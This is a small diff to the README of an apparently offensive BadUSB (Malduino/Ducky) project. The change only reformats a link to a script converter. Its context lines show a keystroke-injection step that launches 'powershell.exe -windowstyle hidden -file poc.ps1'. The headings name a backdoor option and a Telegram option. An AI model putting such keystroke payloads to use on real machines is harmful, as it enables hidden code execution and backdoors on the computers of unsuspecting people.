@@ -38,7 +38,6 @@ STRING powershell.exe -windowstyle hidden -file poc.ps1
 DELAY 500
 ENTER
 ```
-https://malduino.com/converter/ 
 
 ## Option 2 (Backdoor)
 
@@ -66,7 +65,7 @@ DELAY 500
 ENTER
 ```
 
-https://malduino.com/converter/
+> Link to convert those scripts to .ino: https://malduino.com/converter/
 
 ### Telegram Options
 
